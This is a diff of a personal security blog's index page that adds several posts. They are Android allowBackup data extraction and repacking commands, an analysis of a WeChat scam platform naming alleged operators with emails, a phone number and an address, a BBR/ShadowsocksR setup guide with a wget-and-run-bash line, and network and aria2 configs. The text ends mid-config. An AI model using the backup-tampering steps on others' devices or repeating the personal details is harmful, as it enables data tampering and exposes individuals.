@@ -234,7 +234,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2018/10/12/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2018/10/12/Android-allowBackup-tips/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xl7dev">
@@ -253,7 +253,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/10/12/hello-world/" itemprop="url">Hello World</a></h1>
+                <a class="post-title-link" href="/2018/10/12/Android-allowBackup-tips/" itemprop="url">Android allowBackup tips</a></h1>
         
 
         <div class="post-meta">
@@ -265,7 +265,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T14:51:36+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T17:54:49+08:00">
                 2018-10-12
               </time>
             
@@ -305,15 +305,1463 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+            <p>Android allowBackup tips</p>
+<h3 id="root-device"><a href="#root-device" class="headerlink" title="root device"></a>root device</h3><h4 id="0x01-backup"><a href="#0x01-backup" class="headerlink" title="0x01 backup"></a>0x01 backup</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb backup com.example.sharedprefs -f com.example.sharedprefs.ab</span><br></pre></td></tr></table></figure>
+<h4 id="0x02-unpack"><a href="#0x02-unpack" class="headerlink" title="0x02 unpack"></a>0x02 unpack</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar abe.jar unpack com.example.sharedprefs.ab com.example.sharedprefs.tar</span><br></pre></td></tr></table></figure>
+<h4 id="0x03-tar2ab"><a href="#0x03-tar2ab" class="headerlink" title="0x03 tar2ab"></a>0x03 tar2ab</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar abe.jar pack com.example.sharedprefs.tar com.example.sharedprefs.ab</span><br></pre></td></tr></table></figure>
+<h4 id="0x04-restore"><a href="#0x04-restore" class="headerlink" title="0x04 restore"></a>0x04 restore</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb restore back com.example.sharedprefs.ab</span><br></pre></td></tr></table></figure>
+<p><a href="http://jaist.dl.sourceforge.net/project/adbextractor/abe.jar" target="_blank" rel="noopener">Download abe.jar</a></p>
+<h3 id="not-root-device"><a href="#not-root-device" class="headerlink" title="not root device"></a>not root device</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb backup -f com.example.sharedprefs.ab com.example.sharedprefs</span><br><span class="line">&gt; binwalk com.example.sharedprefs.ab</span><br><span class="line">&gt; dd if=com.example.sharedprefs.ab bs=24 skip=1| openssl zlib -d &gt; com.example.sharedprefs.tar</span><br><span class="line">&gt; tar -tf com.example.sharedprefs.tar &gt; com.example.sharedprefs.list</span><br><span class="line">&gt; tar -xf com.example.sharedprefs.tar</span><br><span class="line">&gt; cd apps/com.example.sharedprefs/sp/</span><br><span class="line">&gt; star -c -v -f newbackup.tar -no-dirslash list=com.example.sharedprefs.list</span><br><span class="line">&gt; dd if=com.example.sharedprefs.ab bs=24 count=1 of=newbackup.ab</span><br><span class="line">&gt; openssl zlib -in newbackup.tar &gt;&gt; newbackup.ab</span><br><span class="line">&gt; adb restore newbackup.ab</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2018/10/12/Free-WeChat-friend-detection-platform-trap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/12/Free-WeChat-friend-detection-platform-trap/" itemprop="url">Free WeChat friend detection platform trap</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T15:31:39+08:00">
+                2018-10-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tps.oy54.cn</span><br><span class="line">p1.mug0.cn</span><br></pre></td></tr></table></figure>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
+<li><a href="http://tps.oy54.cn/Login.aspx" target="_blank" rel="noopener">http://tps.oy54.cn/Login.aspx</a></li>
+<li><a href="http://p1.mug0.cn/Login.aspx" target="_blank" rel="noopener">http://p1.mug0.cn/Login.aspx</a></li>
+</ol>
+<p>redirect to</p>
+<table>
+<thead>
+<tr>
+<th>PC UA</th>
+<th>Mobile UA</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://main.haidaowx.cn/Login.aspx" target="_blank" rel="noopener">http://main.haidaowx.cn/Login.aspx</a></td>
+<td><a href="http://wx001.ailuquan.cn/index/index/sao?user=35641&amp;type=1" target="_blank" rel="noopener">http://wx001.ailuquan.cn/index/index/sao?user=35641&amp;type=1</a></td>
+</tr>
+</tbody>
+</table>
+<p><img src="Free-WeChat-friend-detection-platform-trap/tps.oy54.cn_response.png" alt="tps_response"><br><img src="Free-WeChat-friend-detection-platform-trap/main.haidaowx.cn.png" alt="haidaowx"><br><img src="Free-WeChat-friend-detection-platform-trap/wx001.ailuquan.cn.png" alt="ailuquan"></p>
+<h3 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h3><h4 id="mug0-cn"><a href="#mug0-cn" class="headerlink" title="mug0.cn"></a>mug0.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蔡文学/13560062@qq.com</span><br></pre></td></tr></table></figure>
+<h4 id="tps-oy54-cn"><a href="#tps-oy54-cn" class="headerlink" title="tps.oy54.cn"></a>tps.oy54.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">刘洁/13560062@qq.com</span><br></pre></td></tr></table></figure>
+<h4 id="ailuquan-cn"><a href="#ailuquan-cn" class="headerlink" title="ailuquan.cn"></a>ailuquan.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">王焱/3300308307@qq.com</span><br></pre></td></tr></table></figure>
+<h3 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">domain：3300308307.com</span><br><span class="line">支付宝：3300308307@qq.com==&gt;信阳同城网络科技有限公司</span><br></pre></td></tr></table></figure>
+<h3 id="Qichacha"><a href="#Qichacha" class="headerlink" title="Qichacha"></a>Qichacha</h3><table>
+<thead>
+<tr>
+<th>company</th>
+<th>mobile</th>
+<th>email</th>
+<th>address</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>信阳同城网络科技有限公司</td>
+<td>13033785072</td>
+<td><a href="mailto:itwy88@163.com" target="_blank" rel="noopener">itwy88@163.com</a></td>
+<td>信阳市浉河区中山北路弘运鑫鑫广场写字楼1416号房</td>
+<td>苏阳【微清官方团队】王焱</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>此平台通过在手机上发布微信僵尸粉检测来获取用户信息，主要用途: </p>
+<ol>
+<li>投票</li>
+<li>文章访问量</li>
+<li>诈骗</li>
+<li>推广</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/06/21/Google-TCPBBR-With-Shadowsocksr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/06/21/Google-TCPBBR-With-Shadowsocksr/" itemprop="url">Google TCPBBR With Shadowsocksr</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-21T17:17:32+08:00">
+                2017-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="Google-TCPBBR"><a href="#Google-TCPBBR" class="headerlink" title="Google TCPBBR"></a>Google TCPBBR</h4><p>CentOS 6+，Debian 7+，Ubuntu 12+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11/linux-headers-4.11.0-041100_4.11.0-041100.201705041534_all.deb</span><br><span class="line">&gt; dpkg -i linux-image-4.*.deb</span><br><span class="line">&gt; update-grub</span><br><span class="line">&gt; reboot</span><br><span class="line">&gt; modprobe tcp_bbr</span><br><span class="line">&gt; echo &quot;tcp_bbr&quot; &gt;&gt; /etc/modules-load.d/modules.conf</span><br><span class="line">&gt; echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">&gt; echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">&gt; sysctl -p</span><br><span class="line">&gt; sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">&gt; sysctl net.ipv4.tcp_congestion_control</span><br></pre></td></tr></table></figure>
+<p>or quick install via bash script<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget -N --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; bash bbr.sh</span><br><span class="line">&gt; uname -r  # if have 4.9.0 success install</span><br><span class="line">&gt; sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">&gt; sysctl net.ipv4.tcp_congestion_control</span><br><span class="line">&gt; sysctl net.core.default_qdisc</span><br><span class="line">&gt; lsmod | grep bbr    # have bbr success install</span><br></pre></td></tr></table></figure></p>
+<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apt-get install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr</span><br></pre></td></tr></table></figure>
+<p>Debian / Ubuntu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apt-get install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p>
+<p>CentOS:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; yum install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p>
+<p>Windows:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd shadowsocksr &amp;&amp; bash initcfg.sh</span><br><span class="line">&gt; cd ~/shadowsocksr/shadowsocks</span><br><span class="line">&gt; python server.py -p 443 -k password -m aes-128-cfb -O auth_chain_a -o tls1.2_ticket_auth -d start</span><br></pre></td></tr></table></figure>
+<h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p>Android APP: <a href="https://github.com/shadowsocksr/shadowsocksr-android/releases" target="_blank" rel="noopener">SSR-android</a></p>
+<p>iOS APP： <a href="https://itunes.apple.com/us/app/shadowrocket/id932747118" target="_blank" rel="noopener">Shadowrocket</a>, <a href="https://itunes.apple.com/app/id1162704202?mt=8" target="_blank" rel="noopener">Potatso2</a></p>
+<p>MAC APP：<a href="https://github.com/shadowsocksr/ShadowsocksX-NG/releases" target="_blank" rel="noopener">ShadowsocksX-NG-R8</a></p>
+<p>其它跨平台分支：<a href="https://github.com/avege/avege" target="_blank" rel="noopener">avege</a>, <a href="https://github.com/erguotou520/electron-ssr" target="_blank" rel="noopener">electron-ssr</a></p>
+<h4 id="Speed-Setting"><a href="#Speed-Setting" class="headerlink" title="Speed Setting"></a>Speed Setting</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; vi /etc/security/limits.conf  # add line to file</span><br><span class="line">*   soft    nofile  512000</span><br><span class="line">*   hard    nofile  1024000</span><br><span class="line">&gt; vi /etc/profile   # add line to file</span><br><span class="line">ulimit -SHn 1024000</span><br><span class="line">&gt; reboot</span><br><span class="line">&gt; ulimit -n     # if return 1024000 success</span><br><span class="line">&gt; vi /etc/sysctl.conf</span><br><span class="line"># turn on TCP Fast Open on both client and server side</span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line">&gt; vi /etc/shadowsocks.json  # edit false to true</span><br><span class="line">&quot;fast_open&quot;: true</span><br><span class="line">&gt; apt-get install python-m2crypto</span><br><span class="line">&gt; pip install M2Crypto --upgrade</span><br><span class="line">&gt; apt-get install python-dev libevent-dev python-setuptools python-gevent</span><br><span class="line">easy_install greenlet gevent</span><br></pre></td></tr></table></figure>
+<p>Docker: <a href="https://hub.docker.com/r/breakwa11/shadowsocksr/" target="_blank" rel="noopener">https://hub.docker.com/r/breakwa11/shadowsocksr/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/05/02/Ubuntu16-04-2-network-not-work/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/05/02/Ubuntu16-04-2-network-not-work/" itemprop="url">Ubuntu16.04.2 network not work</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-02T11:52:38+08:00">
+                2017-05-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Create-a-new-template"><a href="#Create-a-new-template" class="headerlink" title="Create a new template"></a>Create a new template</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">右上角网络连接&gt;&gt;编辑连接&gt;&gt;增加&gt;&gt;</span><br><span class="line">以太网 &gt;&gt; 1) 填写连接名称：ethernet</span><br><span class="line">          2) 选择设备</span><br><span class="line">802.1X安全性 &gt;&gt; </span><br><span class="line">	1) 勾选对此连接使用802.1X安全配置</span><br><span class="line">	2) 认证选择受保护的EAP(PEAP)</span><br><span class="line">	3) 勾选不需要CA证书(R)</span><br><span class="line">	4) 内部认证&gt;&gt;MSCHAPv2</span><br><span class="line">	5) 输入帐号和密码</span><br><span class="line">IPv4 &gt;&gt; 勾选需要IPv4地址完成这个连接</span><br></pre></td></tr></table></figure>
+<h3 id="setting"><a href="#setting" class="headerlink" title="setting"></a>setting</h3><blockquote>
+<p>sudo cat /etc/NetworkManager/system-connections/ethernet</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[connection]</span><br><span class="line">id=ethernet</span><br><span class="line">uuid=9e123fbc-0123-46e3-97b5-f3214e123456</span><br><span class="line">type=ethernet</span><br><span class="line">interface-name=eno1</span><br><span class="line">permissions=</span><br><span class="line">secondaries=</span><br><span class="line"></span><br><span class="line">[ethernet]</span><br><span class="line">duplex=full</span><br><span class="line">mac-address=0A:12:3C:DA:C1:A5</span><br><span class="line">mac-address-blacklist=</span><br><span class="line"></span><br><span class="line">[802-1x]</span><br><span class="line">altsubject-matches=</span><br><span class="line">eap=peap;</span><br><span class="line">identity=username   # replace you login username</span><br><span class="line">password=password   # replace you login password</span><br><span class="line">phase2-altsubject-matches=</span><br><span class="line">phase2-auth=mschapv2</span><br><span class="line">system-ca-certs=true</span><br><span class="line"></span><br><span class="line">[ipv4]</span><br><span class="line">dns-search=</span><br><span class="line">may-fail=false</span><br><span class="line">method=auto</span><br><span class="line"></span><br><span class="line">[ipv6]</span><br><span class="line">addr-gen-mode=stable=privacy</span><br><span class="line">dns-search=</span><br><span class="line">ip6-privacy=0</span><br><span class="line">method=auto</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/04/11/Aria2-Usage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/04/11/Aria2-Usage/" itemprop="url">Aria2 Usage</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-11T11:07:16+08:00">
+                2017-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Install"><a href="#0x01-Install" class="headerlink" title="0x01 Install"></a>0x01 Install</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install aria2</span><br></pre></td></tr></table></figure>
+<p><a href="https://github.com/acgotaku/BaiduExporter/" target="_blank" rel="noopener">BaiduExporter</a></p>
+<p><a href="https://github.com/acgotaku/115/" target="_blank" rel="noopener">115</a></p>
+<p><a href="https://chrome.google.com/webstore/detail/thunderlixianassistant/eehlmkfpnagoieibahhcghphdbjcdmen?hl=zh-CN" target="_blank" rel="noopener">xunlei</a></p>
+<p><a href="https://github.com/yangshun1029/aria2gui" target="_blank" rel="noopener">aria2gui</a></p>
+<h3 id="0x02-Setting"><a href="#0x02-Setting" class="headerlink" title="0x02 Setting"></a>0x02 Setting</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&gt; mkdir ~/.aria2 &amp;&amp; cd ~/.aria2</span><br><span class="line">&gt; touch aria2.conf</span><br><span class="line">&gt; vi aria2.conf     # add lines to aria2.conf</span><br><span class="line">#用户名</span><br><span class="line">#rpc-user=user</span><br><span class="line">#密码</span><br><span class="line">#rpc-passwd=passwd</span><br><span class="line">#设置加密的密钥</span><br><span class="line">#rpc-secret=secret</span><br><span class="line">#允许rpc</span><br><span class="line">enable-rpc=true</span><br><span class="line">#允许所有来源, web界面跨域权限需要</span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line">#是否启用https加密，启用之后要设置公钥,私钥的文件路径</span><br><span class="line">#rpc-secure=true</span><br><span class="line">#启用加密设置公钥</span><br><span class="line">#rpc-certificate=/home/name/.config/aria2/example.crt</span><br><span class="line">#启用加密设置私钥</span><br><span class="line">#rpc-private-key=/home/name/.config/aria2/example.key</span><br><span class="line">#允许外部访问，false的话只监听本地端口</span><br><span class="line">rpc-listen-all=false</span><br><span class="line">#RPC端口, 仅当默认端口被占用时修改</span><br><span class="line">#rpc-listen-port=6800</span><br><span class="line">#最大同时下载数(任务数), 路由建议值: 3</span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line">#断点续传</span><br><span class="line">continue=true</span><br><span class="line">#同服务器连接数</span><br><span class="line">max-connection-per-server=5</span><br><span class="line">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span><br><span class="line">min-split-size=10M</span><br><span class="line">#单文件最大线程数, 路由建议值: 5</span><br><span class="line">split=10</span><br><span class="line">#下载速度限制</span><br><span class="line">max-overall-download-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-download-limit=0</span><br><span class="line">#上传速度限制</span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line">#单文件速度限制</span><br><span 